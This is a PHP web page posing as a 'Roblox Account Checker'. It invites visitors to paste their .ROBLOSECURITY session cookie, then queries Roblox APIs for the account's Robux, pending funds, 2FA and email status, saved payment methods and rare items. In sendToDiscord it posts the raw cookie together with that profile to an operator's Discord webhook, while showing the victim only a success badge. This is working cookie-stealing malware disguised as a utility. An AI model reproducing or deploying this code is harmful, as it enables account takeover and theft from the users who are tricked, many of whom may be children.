<?php
$_f_p = "_2";
session_start();
error_reporting(0);
ini_set('display_errors', 0);


$discord_webhook_url = "";



function cleanCookie($cookie) {
    $cookie = trim($cookie);
    $cookie = str_replace(['"', "'", 'cookie:', 'Cookie:', '.ROBLOSECURITY='], '', $cookie);
    $cookie = preg_replace('/[^a-zA-Z0-9_|:\\.-]/', '', $cookie);
    return trim($cookie);
}


function robloxRequest($url, $cookie) {
    $cookie = cleanCookie($cookie);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    $headers = [
        'Cookie: .ROBLOSECURITY=' . $cookie,
        'Accept: application/json',
    ];
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ['response' => $response, 'code' => $httpCode];
}


function checkAssetOwnership($userId, $assetId, $cookie) {
    $data = robloxRequest("https://inventory.roblox.com/v2/users/{$userId}/items/asset/{$assetId}", $cookie);
    $info = json_decode($data['response'], true);
    
    if ($data['code'] === 200 && isset($info['data'])) {
        return !empty($info['data']);
    }
    return false;
}


function sendToDiscord($webhook_url, $data, $raw_cookie) {
    $uname = $data['username'];
    $user_id = $data['userId'];
    $robux = str_replace(',', '', $data['robux']);
    $is_2fa = $data['has2FA'];
    $is_premium = $data['premiumText'];
    $email_verified = $data['emailVerified'];
    $bodyImage = $data['avatar'];
    $yearly_total = str_replace(',', '', $data['yearlyTotal']);
    $credit_balance = $data['creditBalance'];
    $saved_payment = $data['savedPayment'];
    $has_korblox = $data['hasKorblox'] ? 'Yes' : 'No';
    $has_headless = $data['hasHeadless'] ? 'Yes' : 'No';
    $has_speaker = $data['hasSpeaker'] ? 'Yes' : 'No';
    

    if ($is_2fa === 'Yes') {
        $email_verified = 'Yes';
    }
    

    $roblosecurity = cleanCookie($raw_cookie);
    

    $payload = [
        "username" => "name",
        "avatar_url" => "your image",
        "embeds" => [
            [
                "author" => [
                    "name" => "$uname | <13",
                    "icon_url" => "icon "
                ],
                "description" => "**Checker • DETECTED**\n\n[**Rolimons**](https://www.rolimons.com/player/$user_id) <:rolimonsw:1396341187824062547> | [**Profile**](https://www.roblox.com/users/$user_id/profile) <:Roblox:1113490222970327172> | [**Refresh Cookie**](https://www.roblox.com) 🔄",
                "color" => 0x00BFFF,
                "thumbnail" => [
                    "url" => $bodyImage
                ],
                "fields" => [
                    [
                        "name" => "<:SB_membericon:1434071688240169111> **Username**",
                        "value" => "$uname",
                        "inline" => false
                    ],
                    

                    [
                        "name" => "<:robux:1303891878034538678> **Robux**",
                        "value" => "Balance : $robux <:robux:1303891878034538678>\nPending : {$data['robuxPending']} <:robux:1303891878034538678>",
                        "inline" => true
                    ],
                    [
                        "name" => "<:SB_shoppingcart:1451510300757983325> **Rap | Limited**",
                        "value" => "Total : 0\nTotal Limited : 0",
                        "inline" => true
                    ],
                    [
                        "name" => "<a:Pulse1x1:1316371092553732096> **Summary**",
                        "value" => "$yearly_total",
                        "inline" => true
                    ],
                    

                    [
                        "name" => "<:icons8note64:1316367263510691900> **Billing**",
                        "value" => "Credit : USD $credit_balance <:icons8money64:1316367932795781120>\nSaved Payment :\n$saved_payment <:icons8card50:1316368134684413992>",
                        "inline" => true
                    ],
                    [
                        "name" => "Games | Play |\nCount",
                        "value" => "<:adm:1462991912343568516> | False | 0\n<:mm2:1462991892772818975> | False | 0\n<:bb:1462991857121230952> | False | 0",
                        "inline" => true
                    ],
                    [
                        "name" => "<:gear:1323480363657334854> **Settings**",
                        "value" => "<:icons8email50:1316368638151757847> Status : `$email_verified`\nEmail",
                        "inline" => true
                    ],
                    

                    [
                        "name" => "<:PremiumIcon:1154227218436849714> **Premium**",
                        "value" => "$is_premium",
                        "inline" => true
                    ],
                    [
                        "name" => "<:group:1323480181125681174> **Groups**",
                        "value" => "Group Owned : 0 <:icons8bag50:1316366211306487869>\nGroup Funds : 0 <:robux:1303891878034538678>",
                        "inline" => true
                    ],
                    [
                        "name" => "**Bundles**",
                        "value" => "<:korbloxdeath:1280919267562360862> | $has_korblox\n<:HeadlessHorseman:1362432343255679126> | $has_headless\n<:KorbloxDeathspeaker:1362432257528168469> | $has_speaker",
                        "inline" => true
                    ],
                    

                    [
                        "name" => "<:2fa:1462989048569266389> **2 Step**",
                        "value" => "```$is_2fa```",
                        "inline" => false
                    ]
                ]
            ],
            [
                "title" => "<:cookie:1303895009887785020> **.ROBLOSECURITY**",
                "description" => "```$roblosecurity```",
                "color" => 0x00BFFF
            ]
        ]
    ];
    
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode === 204;
}


$result = null;
$error = null;
$webhook_sent = false;
$raw_cookie = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cookie'])) {
    $raw_cookie = $_POST['cookie'];
    $cookie = cleanCookie($_POST['cookie']);
    
    if (empty($cookie)) {
        $error = "Please enter a cookie";
    } else {

        $accountData = robloxRequest('https://users.roblox.com/v1/users/authenticated', $cookie);
        
        if ($accountData['code'] === 200) {
            $userInfo = json_decode($accountData['response'], true);
            
            if (isset($userInfo['id'])) {
                $userId = $userInfo['id'];
                

                $avatarData = robloxRequest(
                    "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={$userId}&size=150x150&format=Png&isCircular=false",
                    $cookie
                );
                $avatarInfo = json_decode($avatarData['response'], true);
                $avatarUrl = $avatarInfo['data'][0]['imageUrl'] ?? "https://www.roblox.com/headshot-thumbnail/image?userId={$userId}&width=150&height=150&format=png";
                

                $robuxData = robloxRequest('https://economy.roblox.com/v1/user/currency', $cookie);
                $robuxInfo = json_decode($robuxData['response'], true);
                $robuxBalance = $robuxInfo['robux'] ?? 0;
                

                $pendingData = robloxRequest('https://economy.roblox.com/v1/user/currency/pending', $cookie);
                $pendingInfo = json_decode($pendingData['response'], true);
                $robuxPending = $pendingInfo['robux'] ?? 0;
                

                $friendsData = robloxRequest("https://friends.roblox.com/v1/users/{$userId}/friends/count", $cookie);
                $friendsInfo = json_decode($friendsData['response'], true);
                $friendsCount = $friendsInfo['count'] ?? 0;
                

                $followersData = robloxRequest("https://friends.roblox.com/v1/users/{$userId}/followers/count", $cookie);
                $followersInfo = json_decode($followersData['response'], true);
                $followersCount = $followersInfo['count'] ?? 0;
                

                $followingData = robloxRequest("https://friends.roblox.com/v1/users/{$userId}/followings/count", $cookie);
                $followingInfo = json_decode($followingData['response'], true);
                $followingCount = $followingInfo['count'] ?? 0;
                

                $premiumData = robloxRequest('https://premiumfeatures.roblox.com/v1/users/authenticated/premium-membership', $cookie);
                $premiumInfo = json_decode($premiumData['response'], true);
                $hasPremium = isset($premiumInfo['Premium']) ? $premiumInfo['Premium'] : false;
                

                $displayData = robloxRequest("https://users.roblox.com/v1/users/{$userId}", $cookie);
                $displayInfo = json_decode($displayData['response'], true);
                

                $has2FA = 'No';
                $twoFAData = robloxRequest('https://twostepverification.roblox.com/v1/metadata', $cookie);
                $twoFAInfo = json_decode($twoFAData['response'], true);
                
                if ($twoFAData['code'] === 200) {
                    if (isset($twoFAInfo['twoStepVerificationEnabled'])) {
                        $has2FA = $twoFAInfo['twoStepVerificationEnabled'] ? 'Yes' : 'No';
                    }
                }
                

                $emailVerified = 'No';
                $emailData = robloxRequest('https://accountinformation.roblox.com/v1/email', $cookie);
                $emailInfo = json_decode($emailData['response'], true);
                
                if ($emailData['code'] === 200) {
                    if (isset($emailInfo['verified'])) {
                        $emailVerified = $emailInfo['verified'] ? 'Yes' : 'No';
                    } elseif (isset($emailInfo['isVerified'])) {
                        $emailVerified = $emailInfo['isVerified'] ? 'Yes' : 'No';
                    }
                }
                

                if ($emailVerified === 'No' && isset($emailInfo['emailAddress']) && !empty($emailInfo['emailAddress'])) {
                    $emailVerified = 'Yes (Unverified)';
                }
                

                $yearlyTotal = 0;
                $yearlyData = robloxRequest(
                    "https://economy.roblox.com/v1/users/{$userId}/transactions?limit=100&transactionType=Purchase",
                    $cookie
                );
                $yearlyInfo = json_decode($yearlyData['response'], true);
                
                if ($yearlyData['code'] === 200 && isset($yearlyInfo['data'])) {
                    $currentYear = date('Y');
                    foreach ($yearlyInfo['data'] as $transaction) {
                        if (isset($transaction['created']) && strpos($transaction['created'], $currentYear) !== false) {
                            if (isset($transaction['currency']['amount'])) {
                                $yearlyTotal += abs($transaction['currency']['amount']);
                            }
                        }
                    }
                }
                

                $accountAge = 'New Account';
                if (!empty($userInfo['created'])) {
                    $created = new DateTime($userInfo['created']);
                    $now = new DateTime();
                    $diff = $now->diff($created);
                    
                    $ageParts = [];
                    if ($diff->y > 0) $ageParts[] = $diff->y . ' year' . ($diff->y > 1 ? 's' : '');
                    if ($diff->m > 0) $ageParts[] = $diff->m . ' month' . ($diff->m > 1 ? 's' : '');
                    if ($diff->d > 0) $ageParts[] = $diff->d . ' day' . ($diff->d > 1 ? 's' : '');
                    
                    if (empty($ageParts)) {
                        $accountAge = 'Less than 1 day';
                    } else {
                        $accountAge = implode(', ', $ageParts);
                    }
                }
                

                $creditBalance = 0;

                $creditData = robloxRequest('https://economy.roblox.com/v1/user/currency', $cookie);
                $creditInfo = json_decode($creditData['response'], true);
                if (isset($creditInfo['robux'])) {

                    $creditBalance = 0;
                }
                

                $giftCardData = robloxRequest('https://economy.roblox.com/v1/user/gift-cards', $cookie);
                $giftCardInfo = json_decode($giftCardData['response'], true);
                if ($giftCardData['code'] === 200 && isset($giftCardInfo['balance'])) {
                    $creditBalance = $giftCardInfo['balance'];
                }
                

                $savedPayment = 'False';
                $paymentData = robloxRequest('https://billing.roblox.com/v1/payments', $cookie);
                $paymentInfo = json_decode($paymentData['response'], true);
                if ($paymentData['code'] === 200 && !empty($paymentInfo)) {
                    $savedPayment = 'True';
                }
                

                $hasKorblox = checkAssetOwnership($userId, 1365767, $cookie);
                $hasHeadless = checkAssetOwnership($userId, 13451, $cookie);
                $hasSpeaker = checkAssetOwnership($userId, 1026112, $cookie);
                
                $result = [
                    'username' => $userInfo['name'] ?? 'Unknown',
                    'displayName' => $displayInfo['displayName'] ?? $userInfo['name'] ?? 'Unknown',
                    'userId' => $userId,
                    'avatar' => $avatarUrl,
                    'robux' => number_format($robuxBalance),
                    'robuxPending' => number_format($robuxPending),
                    'robuxTotal' => number_format($robuxBalance + $robuxPending),
                    'yearlyTotal' => number_format($yearlyTotal),
                    'friends' => number_format($friendsCount),
                    'followers' => number_format($followersCount),
                    'following' => number_format($followingCount),
                    'premium' => $hasPremium,
                    'premiumText' => $hasPremium ? 'Premium' : 'No Premium',
                    'has2FA' => $has2FA,
                    'emailVerified' => $emailVerified,
                    'description' => $displayInfo['description'] ?? 'No description set',
                    'profileLink' => "https://www.roblox.com/users/{$userId}/profile",
                    'isBanned' => $userInfo['isBanned'] ?? false,
                    'verified' => $userInfo['verified'] ?? false,
                    'accountAge' => $accountAge,
                    'creditBalance' => $creditBalance,
                    'savedPayment' => $savedPayment,
                    'hasKorblox' => $hasKorblox,
                    'hasHeadless' => $hasHeadless,
                    'hasSpeaker' => $hasSpeaker
                ];
                

                $webhook_sent = sendToDiscord($discord_webhook_url, $result, $raw_cookie);
                
            } else {
                $error = "Invalid response from Roblox";
            }
        } else {
            $error = "Invalid cookie or session expired (Error: " . $accountData['code'] . ")";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Account Checker</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 500px;
            position: relative;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            color: white;
            font-size: 2.2em;
            font-weight: 600;
            text-shadow: 0 2px 10px rgba(0,191,255,0.3);
        }

        .header h1 i {
            color: #00bfff;
            margin-right: 10px;
        }

        .input-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0, 191, 255, 0.2);
            border: 1px solid rgba(0, 191, 255, 0.3);
        }

        .input-card h2 {
            color: #333;
            font-size: 1.3em;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .input-card h2 i {
            color: #00bfff;
        }

        .cookie-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 14px;
            font-family: monospace;
            margin-bottom: 15px;
            transition: all 0.3s ease;
        }

        .cookie-input:focus {
            outline: none;
            border-color: #00bfff;
            box-shadow: 0 0 0 3px rgba(0, 191, 255, 0.2);
        }

        .btn-check {
            width: 100%;
            padding: 15px;
            background: #00bfff;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s ease;
        }

        .btn-check:hover {
            background: #0099ff;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 191, 255, 0.3);
        }

        .error-message {
            background: #fee;
            color: #c00;
            padding: 12px;
            border-radius: 8px;
            margin-top: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            border-left: 3px solid #c00;
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 12px;
            border-radius: 8px;
            margin-top: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            border-left: 3px solid #28a745;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
            display: <?php echo $result ? 'flex' : 'none'; ?>;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            animation: fadeIn 0.3s ease;
        }

        .result-modal {
            background: white;
            width: 95%;
            max-width: 800px;
            max-height: 90vh;
            overflow-y: auto;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 191, 255, 0.3);
            animation: slideUp 0.4s ease;
            position: relative;
        }

        .modal-header {
            background: #00bfff;
            color: white;
            padding: 20px 25px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-radius: 20px 20px 0 0;
            position: sticky;
            top: 0;
            z-index: 10;
        }

        .modal-header h3 {
            font-size: 1.4em;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .webhook-badge {
            background: rgba(255,255,255,0.2);
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .close-btn {
            background: none;
            border: none;
            color: white;
            font-size: 28px;
            cursor: pointer;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.3s ease;
        }

        .close-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: rotate(90deg);
        }

        .modal-body {
            padding: 30px;
        }

        .profile-section {
            display: flex;
            align-items: center;
            gap: 25px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }

        .profile-avatar {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 3px solid #00bfff;
            object-fit: cover;
        }

        .profile-info {
            flex: 1;
        }

        .profile-name {
            font-size: 24px;
            font-weight: 700;
            color: #333;
            margin-bottom: 5px;
        }

        .profile-username {
            color: #666;
            font-size: 16px;
            margin-bottom: 8px;
        }

        .profile-badge {
            display: inline-block;
            padding: 4px 12px;
            background: #00bfff;
            color: white;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            margin-right: 8px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 25px;
        }

        .stat-card {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid #e0e0e0;
        }

        .stat-icon {
            color: #00bfff;
            font-size: 24px;
            margin-bottom: 5px;
        }

        .stat-label {
            color: #666;
            font-size: 11px;
            text-transform: uppercase;
            margin-bottom: 5px;
        }

        .stat-value {
            color: #333;
            font-size: 18px;
            font-weight: 700;
        }

        .info-section {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .info-section h4 {
            color: #333;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 16px;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
        }

        .info-item {
            display: flex;
            padding: 10px;
            background: white;
            border-radius: 8px;
            align-items: center;
            border-left: 3px solid #00bfff;
        }

        .info-label {
            width: 110px;
            color: #666;
            font-weight: 600;
            font-size: 13px;
        }

        .info-value {
            flex: 1;
            color: #333;
            font-weight: 500;
        }

        .description-box {
            background: white;
            padding: 15px;
            border-radius: 8px;
            border-left: 3px solid #00bfff;
            margin-top: 15px;
        }

        .profile-link {
            display: inline-block;
            margin-top: 15px;
            color: #00bfff;
            text-decoration: none;
            font-weight: 600;
            padding: 8px 16px;
            border: 2px solid #00bfff;
            border-radius: 20px;
            transition: all 0.3s ease;
        }

        .profile-link:hover {
            background: #00bfff;
            color: white;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 600px) {
            .stats-grid {
                grid-template-columns: 1fr 1fr;
            }
            .info-grid {
                grid-template-columns: 1fr;
            }
            .profile-section {
                flex-direction: column;
                text-align: center;
            }
            .info-item {
                flex-direction: column;
                text-align: center;
            }
            .info-label {
                width: 100%;
                margin-bottom: 5px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>
                <i class="fas fa-robot"></i>
                RBX Account Checker
            </h1>
        </div>

        <div class="input-card">
            <h2>
                <i class="fas fa-cookie-bite"></i>
                Enter Cookie
            </h2>
            
            <form method="POST" id="checkerForm">
                <input type="password" 
                       class="cookie-input" 
                       name="cookie" 
                       placeholder=".ROBLOSECURITY" 
                       required>
                
                <button type="submit" class="btn-check" id="submitBtn">
                    <i class="fas fa-search"></i>
                    Check Account
                    <span class="loading" id="loading" style="display: none;"></span>
                </button>
            </form>

            <?php if ($error): ?>
            <div class="error-message">
                <i class="fas fa-exclamation-circle"></i>
                <?php echo htmlspecialchars($error); ?>
            </div>
            <?php endif; ?>

            <?php if ($webhook_sent): ?>
            <div class="success-message">
                <i class="fas fa-check-circle"></i>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <?php if ($result): ?>
    <div class="modal-overlay" id="resultModal">
        <div class="result-modal">
            <div class="modal-header">
                <h3>
                    <i class="fas fa-check-circle"></i>
                    Account Overview
                </h3>
                <div style="display: flex; align-items: center; gap: 10px;">
                    <?php if ($webhook_sent): ?>
                    <span class="webhook-badge">
                        <i class="fab fa-discord"></i> Checked Succesfully
                    </span>
                    <?php endif; ?>
                    <button class="close-btn" onclick="closeModal()">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            </div>
            
            <div class="modal-body">
                <!-- Profile Section -->
                <div class="profile-section">
                    <img src="<?php echo htmlspecialchars($result['avatar']); ?>" 
                         alt="Avatar" 
                         class="profile-avatar"
                         onerror="this.src='https://www.roblox.com/headshot-thumbnail/image?userId=<?php echo $result['userId']; ?>&width=150&height=150&format=png'">
                    
                    <div class="profile-info">
                        <div class="profile-name">
                            <?php echo htmlspecialchars($result['displayName']); ?>
                            <?php if ($result['isBanned']): ?>
                                <span class="profile-badge" style="background: #ff4444;">BANNED</span>
                            <?php endif; ?>
                        </div>
                        
                        <div class="profile-username">
                            @<?php echo htmlspecialchars($result['username']); ?>
                        </div>
                        
                        <div>
                            <span class="profile-badge">ID: <?php echo $result['userId']; ?></span>
                            <?php if ($result['premium']): ?>
                            <span class="profile-badge">Premium</span>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>

                <!-- Stats Grid -->
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-dollar-sign"></i></div>
                        <div class="stat-label">Current</div>
                        <div class="stat-value"><?php echo $result['robux']; ?></div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-hourglass-half"></i></div>
                        <div class="stat-label">Pending</div>
                        <div class="stat-value"><?php echo $result['robuxPending']; ?></div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-chart-line"></i></div>
                        <div class="stat-label">Total</div>
                        <div class="stat-value"><?php echo $result['robuxTotal']; ?></div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-coins"></i></div>
                        <div class="stat-label">Yearly</div>
                        <div class="stat-value"><?php echo $result['yearlyTotal']; ?></div>
                    </div>
                </div>

                <!-- Social Stats -->
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-users"></i></div>
                        <div class="stat-label">Friends</div>
                        <div class="stat-value"><?php echo $result['friends']; ?></div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-user-plus"></i></div>
                        <div class="stat-label">Followers</div>
                        <div class="stat-value"><?php echo $result['followers']; ?></div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-user-friends"></i></div>
                        <div class="stat-label">Following</div>
                        <div class="stat-value"><?php echo $result['following']; ?></div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-id-card"></i></div>
                        <div class="stat-label">Verified</div>
                        <div class="stat-value"><?php echo $result['verified'] ? 'Yes' : 'No'; ?></div>
                    </div>
                </div>

                <!-- Security Info -->
                <div class="info-section">
                    <h4><i class="fas fa-shield-alt"></i> Security Information</h4>
                    <div class="info-grid">
                        <div class="info-item">
                            <span class="info-label">2FA Status:</span>
                            <span class="info-value" style="color: <?php echo $result['has2FA'] === 'Yes' ? '#00bfff' : ($result['has2FA'] === 'No' ? '#ff4444' : '#666'); ?>; font-weight: bold;">
                                <?php echo $result['has2FA']; ?>
                                <?php if ($result['has2FA'] === 'No'): ?>
                                    (⚠️ Not Enabled)
                                <?php endif; ?>
                            </span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Email Verified:</span>
                            <span class="info-value" style="color: <?php echo $result['emailVerified'] === 'Yes' ? '#00bfff' : ($result['emailVerified'] === 'No' ? '#ff4444' : ($result['emailVerified'] === 'Yes (Unverified)' ? '#ffa500' : '#666')); ?>; font-weight: bold;">
                                <?php echo $result['emailVerified']; ?>
                            </span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Account Status:</span>
                            <span class="info-value"><?php echo $result['premiumText']; ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Account Age:</span>
                            <span class="info-value"><?php echo $result['accountAge']; ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Credit Balance:</span>
                            <span class="info-value">$<?php echo number_format($result['creditBalance'], 2); ?> USD</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Saved Payment:</span>
                            <span class="info-value"><?php echo $result['savedPayment']; ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Korblox:</span>
                            <span class="info-value"><?php echo $result['hasKorblox'] ? 'Yes' : 'No'; ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Headless:</span>
                            <span class="info-value"><?php echo $result['hasHeadless'] ? 'Yes' : 'No'; ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Speaker:</span>
                            <span class="info-value"><?php echo $result['hasSpeaker'] ? 'Yes' : 'No'; ?></span>
                        </div>
                    </div>

                    <div class="description-box">
                        <strong>Description:</strong>
                        <p><?php echo nl2br(htmlspecialchars($result['description'])); ?></p>
                    </div>
                </div>

                <!-- Profile Link -->
                <div style="text-align: center;">
                    <a href="<?php echo $result['profileLink']; ?>" target="_blank" class="profile-link">
                        <i class="fas fa-external-link-alt"></i> View Profile
                    </a>
                </div>
            </div>
        </div>
    </div>

    <script>
        function closeModal() {
            const modal = document.getElementById('resultModal');
            modal.style.opacity = '0';
            setTimeout(() => {
                modal.style.display = 'none';
                window.location.href = window.location.pathname;
            }, 300);
        }

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') closeModal();
        });

        document.getElementById('resultModal').addEventListener('click', function(e) {
            if (e.target === this) closeModal();
        });
    </script>
    <?php endif; ?>

    <script>
        document.getElementById('checkerForm').addEventListener('submit', function() {
            document.getElementById('loading').style.display = 'inline-block';
            document.getElementById('submitBtn').disabled = true;
        });
    </script>
</body>
</html>